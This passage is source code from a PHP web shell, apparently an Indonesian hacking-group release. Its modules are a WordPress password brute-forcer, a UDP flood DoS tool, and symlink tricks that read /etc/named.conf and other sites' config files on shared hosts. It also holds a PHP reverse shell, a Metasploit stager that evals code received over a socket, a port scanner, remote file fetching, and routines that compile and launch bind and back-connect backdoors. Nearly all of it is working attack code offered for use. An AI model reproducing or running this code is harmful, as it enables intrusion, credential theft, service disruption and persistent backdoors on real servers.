</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
    if($br == 1) $msg .= "<br />";
    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
    if($stop == 1) exit;
    @flush();@ob_flush();
}
function check($x, $front=0) {
    global $_POST,$site,$false;
    if($front == 0) $t = $site.$x;
    else $t = 'http://'.$x.'.'.$site.'/';
    $headers = get_headers($t);
    if (!eregi('200', $headers[0])) return 0;
    $data = @file_get_contents($t);
    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
    return 1;
}
   
// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
    }
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
    }
   
}
}
//////////////////////////////////////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'wpbrute'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=wpbrute" method="post">
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force ]=--+</font><br>
<center><p>Tanks To <a href="https://www.facebook.com/anton115" target="_blank">Cah_bagus</a></p></b></center>
<form enctype="multipart/form-data" method="POST">
  <table width='624' border='0' class='tabnet' id='Box'>
  <tr><th colspan="5">Wordpress Brute Force</th></tr>
    <tr>
      <td >&nbsp;</td>
      <td ><p>Hosts:</p></td>
      <td ><p> Users:</p></td>
      <td ><p>Passwords:</p></td>
    </tr>
    <tr>
      <td>&nbsp;</td>
      <td ><textarea style="background:black;" name="hosts" cols="30" rows="10" ><?php if($_POST){echo $_POST['hosts'];} ?></textarea></td>
      <td ><textarea style="background:black;" name="usernames" cols="30" rows="10"  ><?php if($_POST){echo $_POST['usernames'];}else {echo "admin";} ?></textarea></td>
      <td ><textarea style="background:black;" name="passwords" cols="30" rows="10"  ><?php if($_POST){echo $_POST['passwords'];}else {echo "admin\nadministrator\n123123\n123321\n123456\n1234567\n12345678\n123456789\n123456123456\nadmin2010\nadmin2011\npassword\nP@ssW0rd\n!@#$%^\n!@#$%^&*(\n(*&^%$#@!\n111111\n222222\n333333\n444444\n555555\n666666\n777777\n888888\n999999";} ?></textarea></td>
    </tr>
<tr><td colspan="4"><input class='inputzbut' type="submit" name="submit" value="Brute Now"  />
<?php
if($_POST)
{
	$hosts = trim(filter($_POST['hosts']));
	$passwords = trim(filter($_POST['passwords']));
	$usernames = trim(filter($_POST['usernames']));

	if($passwords && $usernames && $hosts)
	{
		$hosts_explode = explode("\n", $hosts);
		$usernames_explode = explode("\n", $usernames);
    	$passwords_explode = explode("\n", $passwords);

		foreach($hosts_explode as $host)
		{
			$host = RemoveLastSlash($host);
			$hacked = 0;
			$host = str_replace(array("http://","https://","www."),"",trim($host));
			$host = "http://".$host;
			$wpAdmin = $host.'/wp-admin/';

			if(!url_exists($host."/wp-login.php"))
			{echo "<p>".$host." => <font color='red'>Error In Login Page !</font></p>";ob_flush();flush();continue;}

			foreach($usernames_explode as $username)
			{
				foreach($passwords_explode as $password)
				{
					$ch   =     curl_init();
					curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
					curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
					curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
					curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
					curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
					curl_setopt($ch,CURLOPT_POST,TRUE);
					curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
					$login    =	   curl_exec($ch);

					if(eregi ("profile.php",$login) )
					{
						$hacked = 1;
						echo "<p>".$host." => UserName : [<font color='green'>".$username."</font>] : Password : [<font color='green'>".$password."</font>]</p>";
						ob_flush();flush();break;
					}
				}
				if($hacked == 1){break;}
			}
			if($hacked == 0)
			{echo "<p>".$host." => <font color='red'>Failed !</font></p>";ob_flush();flush();}
		}
	}
	else {echo "<p><font color='red'>All fields are Required ! </font></p>";}
}
?>
</td></tr>
</table></form></center>
<?php
function url_exists($strURL)
{
    $resURL = curl_init();
    curl_setopt($resURL, CURLOPT_URL, $strURL);
    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
    curl_exec ($resURL);
    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
    curl_close ($resURL);
    if ($intReturnCode != 200){return false;}
	else{return true ;}
}
function filter($string)
{
	if(get_magic_quotes_gpc() != 0){return stripslashes($string);	}
	else{return $string;	}
}
function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}
echo "</p>";
}
//////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'dos'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=dos" method="post">
<center><br><br><br>
Your IP: <font color="red"><b><?php echo $my_ip; ?></b></font>&nbsp;(Don't DoS yourself nub)<br><br>
<table class="tabnet" style="width:333px;padding:0 1px;">
<th colspan="5">Ddos Tool</th>
<tr><tr><td>IP Target</td><td>:</td>
<td><input type="text" class="inputz" name="ip" size="48" maxlength="25"  value = "0.0.0.0" onblur = "if ( this.value=='' ) this.value = '0.0.0.0';" onfocus = " if ( this.value == '0.0.0.0' ) this.value = '';"/>
</td></tr><tr><td>Time</td><td>:</td>
<td><input type="text" class="inputz" name="time" size="48" maxlength="25"  value = "time (in seconds)" onblur = "if ( this.value=='' ) this.value = 'time (in seconds)';" onfocus = " if ( this.value == 'time (in seconds)' ) this.value = '';"/>
</td></tr><tr><td>Port</td><td>:</td>
<td><input type="text" class="inputz" name="port" size="48" maxlength="5"  value = "port" onblur = "if ( this.value=='' ) this.value = 'port';" onfocus = " if ( this.value == 'port' ) this.value = '';"/>
</td></tr></tr></table></b><br><input type="submit" class="inputzbut" name="fire" value="  Firee !!!   "><br><br><center>
After initiating the DoS attack, please wait while the browser loads.
</center></form></center>
<?php
$submit = $_POST['fire'];
if (isset($submit)) {

$packets = 0;
$ip = $_POST['ip'];
$rand = $_POST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_POST['time'];

$time = time();
print "Flooded: $ip on port $rand <br><br>";
$max_time = $time+$exec_time;



for($i=0;$i<65535;$i++){
        $out .= "X";
}
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("udp://$ip", $rand, $errno, $errstr, 5);
        if($fp){
                fwrite($fp, $out);
                fclose($fp);
        }
}
echo "Packet complete at ".time('h:i:s')." with $packets (" . round(($packets*65)/1024, 2) . " mB) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
}}

elseif(isset($_GET['x']) && ($_GET['x'] == 'symlink'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=symlink" method="post"><br><br><center><b><font size=4>+--=[ Multi Tool Symlink ]=--+</font></b></center>
<form method='post'><br><center><table class='tabnet'><tr><th colspan='5'><b>Multi Tool Symlink</b></th></tr><tr><th><b>Manual Symlink</b></th><th><b>Auto Symlink</b></th><th><b>Domain List</b></th></tr><tr><td><input class='inputzbut' type='submit'name='symlinkr' value="Manual Symlink" /></td><td><input class='inputzbut' type='submit'name='symlinks' value="Auto Symlink" /></td><td><input class='inputzbut' type='submit' name='domain' value="Domain List" /></td></tr></table></center></form><br><hr><br><br>
<?php 

#==================[ Multi Tool Symlink ]==================#

if(isset($_POST['domain']))
{
echo '<center><h1>+--=[ local domain viewer ]=--+</h1></center><br><br><div class=content>';
$file = @implode(@file("/etc/named.conf"));
if(!$file){ die("<center><b><blink><font style='color:#ff0000'>[-] ERROR</font></blink> &nbsp;:&nbsp;&nbsp; I Can't Read [ /etc/named.conf ]</b></center>"); }
preg_match_all("#named/(.*?).db#",$file ,$r);
$domains = array_unique($r[1]);
//check();
//if(isset($_GET['ShowAll']))
{
echo "<table align=center border=1 width=59% cellpadding=5>
<tr><td colspan=2>[+] There are : [ <font style='color:#ff0000'><b>".count($domains)."</b></font> ] Domain</td></tr>
<tr><td>Domain</td><td>User</td><td>Jumping</td></tr>";
foreach($domains as $domain){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
echo "<tr><td><a href=http://www.".$domain." title='Open This Website'/>".$domain."</a></td><td>".$user['name']."</td><td><a href='?y=/home/".$user['name']."/public_html'>Jumping</a></td></tr>";
} echo "</table>"; } echo '</div>';}

#==================[ Multi Tool Symlink ]==================#

if(isset($_POST['symlinkr']))
{
@set_time_limit(0);
@mkdir('sym',0777);
error_reporting(0);
$htaccess  = "Options all \n DirectoryIndex gaza.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$op =@fopen ('sym/.htaccess','w');
fwrite($op ,$htaccess);
echo '<center><b>+--=[ Manual Symlink ]=--+</b><br><br>
<form method="post"><table class="tabnet"><th colspan="5">Manual Symlink</th><tr>
<td>File Path &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:</td><td><input class="inputz" type="text" name="file" value="/home/user/public_html/config.php" size="60"/></td></tr>
<tr><td>Symlink Name :</td><td><input class="inputz" type="text" name="symfile" value="Config.txt" size="60"/></td></tr>
<tr><td></td><td><input class="inputzbut" type="submit" value="Symlink" name="symlink" /></td></tr></table></form></center>';
$target = $_POST['file']; $symfile = $_POST['symfile']; $symlink = $_POST['symlink'];
if ($symlink) {@symlink("$target","sym/$symfile");
echo '<br><center><a target="_blank" href="sym/'.$symfile.'" >'.$symfile.'</a><center>';}}

#==================[ Multi Tool Symlink ]==================#
  
if(isset($_POST['symlinks']))
{
@set_time_limit(0);
echo "<center><h1>+--=[ Auto Symlink ]=--+</h1></center><br><br><center><div class=content>";
@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf){
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
} else {
echo "<br><br><div class='tmp'><table border='1' bordercolor='#00ff00' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober  = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; $malay = '\.my';
$china	= '\.cn'; $japan = '\.jp'; $austr = '\.au'; $porn = '\.xxx'; $as = '\.uk'; $us 	= '\.us'; $menyan = '\.mm'; $calfn	= '\.ca'; $india = '\.in'; $thai = '\.th'; $com	= '\.com'; $ac	= '\.ac'; $edu	= '\.edu';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi ("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi("$us",$string[1][0]) or eregi("$menyan",$string[1][0]) 
or eregi ("$calfn",$string[1][0]) or eregi ("$calfn",$string[1][0]) or eregi ("$india",$string[1][0]) or eregi("$thai",$string[1][0]) or eregi("$com",$string[1][0])
or eregi ("$ac",$string[1][0]) or eregi ("$edu",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "<tr><td><div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div></td><td>'.$UID['name']."</td><td><a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a></td></tr></div> ";
flush();
} } } }
echo "</center></table>";   }

}
/////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'tool'))
{	@ini_set('output_buffering',0); 
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=tool" method="post">
<?php

error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;
$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
}
////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'whois'))
   {@ini_set('output_buffering',0); 
   ?>
   <form action="?y=<?php echo $pwd; ?>&x=whois" method="post">
   <?php
   @set_time_limit(0);
   @error_reporting(0);
   function sws_domain_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/whois/$site");
   flush();
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_net_info($site)
   {
   $getip = @file_get_contents("http://networktools.nl/asinfo/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_site_ser($site)
   {
   $getip = @file_get_contents("http://networktools.nl/reverseip/$site");
   $ip = @findit($getip,'<pre>','</pre>');
   return $ip;
   flush();
   }
   function sws_sup_dom($site)
   {
   $getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
   $ip = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');
   return $ip;
   flush();
   }
   function sws_port_scan($ip)
   {
   $list_post = array('80','21','22','2082','25','53','110','443','143');
   foreach ($list_post as $o_port)
   {
   $connect = @fsockopen($ip,$o_port,$errno,$errstr,5);
   if($connect)
   {
   echo " $ip : $o_port ??? <u style=\"color: #00ff00\">Open</u> <br /><br />";
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table class="tabnet">
	<tr><th colspan="5">Website Whois</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:#00ff00;background-color:#000000" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:#00ff00;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>
   <div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class=\"ru\"> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class=\"ru\">
   <pre>".sws_domain_info($site)."</pre></div>";
   flush();
   echo "
   <div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_net_info($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_sup_dom($site)."</pre> </div>";
   flush();
   echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class=\"ru\">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
   flush();
   }
   echo '</center>';
   }
elseif(isset($_GET['x']) && ($_GET['x'] == 'about'))
    {@ini_set('output_buffering',0); 
    ?><form action="?y=<?php echo $pwd; ?>&x=about" method="post"><center><br><br><div class='cyber173'>"Terbatas bukan berarti berhenti berkreatifitas"</div>
<br><br><br>terimakasih buat teman-teman ku yang mau membantu saya menyelesaikan shell saya yang versi v3.3 spesial edition ini
<br><br>[ s4mp4h | areg noid | Mr Gãndrunx (Hiddenymouz) | ardan | FH04ZA | antonio HSH | war0k | x shadow | bagonk ]<br><br>dan semua kawan-kawan ku
<br><br><font size="5" color="#00ff00">Tanks to:</font></center><center><marquee direction="up" scrollamount="2" bgcolor="" width="250" height="40"><center>
<p><b><font size="3" color="#00ff00">=[ teman-temanku ]=<br><br>Gabby<br>Antonio HSH<br>R10<br>war0k<br>edelle007<br>Brian kamikaze<br>Clover Lepex<br>Uyap<br>Zinbad<br>FH04ZA<br>Sani marpic<br>plaint text<br>Madan Cyber<br>Cah Bagus<br>
RPG<br>Vallent<br>P4njie_a.k.a<br>Dwi Syntia<br>Ærul Ringgo's<br>Ti'ar Variabel<br>Hmei7<br>De Vinclous<br>Blankon33<br>Doza Cracker<br>
Ying Cracker<br>Iranian Hacker<br>Agus Darlis<br>Kasper Sky<br>Danger Hacker<br>Admin07<br>Zhou you<br>Ksatria.us<br>Cyber Inj3cti0n<br>K2ll33d<br>
Sultan Haikal<br>Aqis<br>Black Shadow<br>crack999<br>Fnatic Crew<br>Coretan Rizal<br>Malaikat Maut<br>Dan teman-teman ku semua<br><br>
=[ grup hacking ]=<br><br>Black Newbie Team<br>3xp1r3 Cyber Army<br>Explore Crew<br>Hack Forum<br>Indonesia Fighter Cyber<br>
Biang Kerox Team<br>Anonymous<br>Gaza Hacker<br>Albanian Hacker<br>Devilz c0de<br>Muslims Cyber Shellz<br>X-Code<br>Indonesian Security<br>Indonesia Black Cyber<br>B-Compi<br>Jasakom<br>Mojopahit Fighter Cyber<br>Lappis<br>
Mojopahit Cyber Dark<br>Crack Hack Forum<br>dan semua grup hacking<br>yang<br>saya naungi dan singgahi<br><br><br>By<br>Cyber173 a.k.a X'1n73ct<br><br>SPESIAL FOR<BR>S1T1 B4RC0D3<br><br><br>
</font></b></p></center></marquee></center><br><br><br>
<?php
}
///////////////////////////////////////////////////////////////////////////////
elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){ @ini_set('output_buffering',0); 
if(isset($_POST['uploadcomp'])){
	if(is_uploaded_file($_FILES['file']['tmp_name'])){
		$path = magicboom($_POST['path']);
		$fname = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$pindah = $path.$fname;
		$stat = @move_uploaded_file($tmp_name,$pindah);		
		if ($stat) {
			$msg = "file uploaded to $pindah";
		}
		else $msg = "failed to upload $fname";
	}
	else $msg = "failed to upload $fname";
}
elseif(isset($_POST['uploadurl'])){@ini_set('output_buffering',0); 
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$path = magicboom($_POST['path']);
	$namafile = download($pilihan,$wurl);
	$pindah = $path.$namafile;
	if(is_file($pindah)) {
		$msg = "file uploaded to $pindah";
	}
	else $msg = "failed to upload $namafile";

}
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=upload" enctype="multipart/form-data" method="post"><table class="tabnet" style="width:320px;padding:0 1px;"><tr><th colspan="2">Upload from computer</th></tr><tr><td colspan="2"><p style="text-align:center;"><input style="color:#000000;" type="file" name="file" /><input type="submit" name="uploadcomp" class="inputzbut" value="Go" style="width:80px;"></p></td>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
</tr></table></form><table class="tabnet" style="width:320px;padding:0 1px;"><tr><th colspan="2">Upload from url</th></tr><tr><td colspan="2"><form method="post" style="margin:0;padding:0;" action="?y=<?php echo $pwd; ?>&amp;x=upload">
<table><tr><td>url</td><td><input class="inputz" type="text" name="wurl" style="width:250px;" value="http://www.some-code/exploits.c"></td></tr>
<tr><td colspan="2"><input type="text" class="inputz" style="width:99%;" name="path" value="<?php echo $pwd; ?>" /></td></tr>
<tr><td><select size="1" class="inputz" name="pilihan"><option value="wwget">wget</option><option value="wlynx">lynx</option><option value="wfread">fread</option><option value="wfetch">fetch</option><option value="wlinks">links</option><option value="wget">GET</option><option value="wcurl">curl</option>
</select></td><td colspan="2"><input type="submit" name="uploadurl" class="inputzbut" value="Go" style="width:246px;"></td></tr></form></table></td>
</tr></table><div style="text-align:center;margin:2px;"><?php echo $msg; ?></div>
<?php }
elseif(isset($_GET['x']) && ($_GET['x'] == 'netsploit')){ @ini_set('output_buffering',0); 

// bind connect with c
if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdc.c",$port_bind_bd_c);
 	exe("gcc -o bdc bdc.c");
 	exe("chmod 777 bdc");
 	@unlink("bdc.c");
 	exe("./bdc ".$port." ".$passwrd." &");
 	$scan = exe("ps aux"); 
	if(eregi("./bdc $por",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg =  "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// bind connect with perl
elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
	$port = trim($_POST['port']);
	$passwrd = trim($_POST['bind_pass']);
	tulis("bdp",$port_bind_bd_pl);
	exe("chmod 777 bdp");
 	$p2=which("perl");
 	exe($p2." bdp ".$port." &");
 	$scan = exe("ps aux"); 
	if(eregi("$p2 bdp $port",$scan)){ $msg = "<p>Process found running, backdoor setup successfully.</p>"; }
	else { $msg = "<p>Process not found running, backdoor not setup successfully.</p>"; }
}
// back connect with c
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcc.c",$back_connect_c);
 	exe("gcc -o bcc bcc.c");
 	exe("chmod 777 bcc");
 	@unlink("bcc.c");
	exe("./bcc ".$ip." ".$port." &");
	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
// back connect with perl
elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
	$ip = trim($_POST['ip']);
	$port = trim($_POST['backport']);
	tulis("bcp",$back_connect);
	exe("chmod +x bcp");
	$p2=which("perl");
 	exe($p2." bcp ".$ip." ".$port." &");
 	$msg = "Now script try connect to ".$ip." port ".$port." ...";
}
elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
{
	$pilihan = trim($_POST['pilihan']);
	$wurl = trim($_POST['wurl']);
	$namafile = download($pilihan,$wurl);
	if(is_file($namafile)) {
	
	$msg = exe($wcmd);
	}
	else $msg = "error: file not found $namafile";
}

?>
<table class="tabnet"><tr><th>Port Binding</th><th>Connect Back</th><th>Load and Exploit</th></tr><tr><td><table>
<form method="post" action="?y=<?php echo $pwd; ?>&amp;x=netsploit"><tr><td>Port</td><td><input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"></td></tr>
<tr><td>Password</td><td><input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"></td></tr>
<tr><td>Use</td><td style="text-align:justify"><p><select class="inputz" size="1" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
